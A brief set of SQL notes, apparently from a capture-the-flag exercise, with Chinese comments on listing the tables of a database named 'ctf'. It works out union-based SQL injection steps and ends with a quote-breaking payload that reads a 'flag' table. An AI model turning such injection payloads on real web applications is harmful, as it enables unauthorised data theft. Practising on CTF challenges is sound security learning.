-- database()  "ctf"
-- 查找ctf中的所有表吧
-- 1. 先查找ctf中的所有表
SHOW TABLES FROM database();

-- select * from ctf union select 1,database(),3#
-- replace 3 with show tables
select * from ctf union select 1,database(),database()#

-- 3' union select 1,database(),flag FROM flag#
